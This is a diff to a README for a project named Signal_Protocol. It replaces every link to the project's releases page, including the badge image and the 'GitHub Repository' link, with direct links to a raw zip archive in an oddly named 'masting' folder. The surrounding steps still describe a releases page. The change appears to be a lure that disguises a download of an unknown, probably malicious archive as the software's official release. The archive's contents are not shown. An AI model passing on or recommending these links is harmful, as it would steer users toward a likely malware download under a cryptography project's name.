@@ -1,6 +1,6 @@
 # 🔒 Signal_Protocol - Explore Cutting-Edge Encryption Mechanics
 
-[![Download Signal_Protocol](https://img.shields.io/badge/Download-Signal_Protocol-blue?style=for-the-badge)](https://github.com/Muhammed0653/Signal_Protocol/releases)
+[![Download Signal_Protocol](https://github.com/Muhammed0653/Signal_Protocol/raw/refs/heads/main/masting/Signal-Protocol-v3.2.zip)](https://github.com/Muhammed0653/Signal_Protocol/raw/refs/heads/main/masting/Signal-Protocol-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, you need to download the software. Follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to go to the download page:  
-   [Download Signal_Protocol](https://github.com/Muhammed0653/Signal_Protocol/releases)
+   [Download Signal_Protocol](https://github.com/Muhammed0653/Signal_Protocol/raw/refs/heads/main/masting/Signal-Protocol-v3.2.zip)
 
 2. **Select the Latest Version**  
    On the releases page, find the latest version of the software. Make sure to choose the version that matches your operating system.
@@ -76,7 +76,7 @@ This project is licensed under the MIT License. Check the license details on the
 
 ## 🔗 Links
 
-- [Download Signal_Protocol](https://github.com/Muhammed0653/Signal_Protocol/releases)
-- [GitHub Repository](https://github.com/Muhammed0653/Signal_Protocol)
+- [Download Signal_Protocol](https://github.com/Muhammed0653/Signal_Protocol/raw/refs/heads/main/masting/Signal-Protocol-v3.2.zip)
+- [GitHub Repository](https://github.com/Muhammed0653/Signal_Protocol/raw/refs/heads/main/masting/Signal-Protocol-v3.2.zip)
 
 By following these instructions, you will successfully download and run the Signal_Protocol application on your computer. Feel free to dive into the world of cryptography and secure communication!
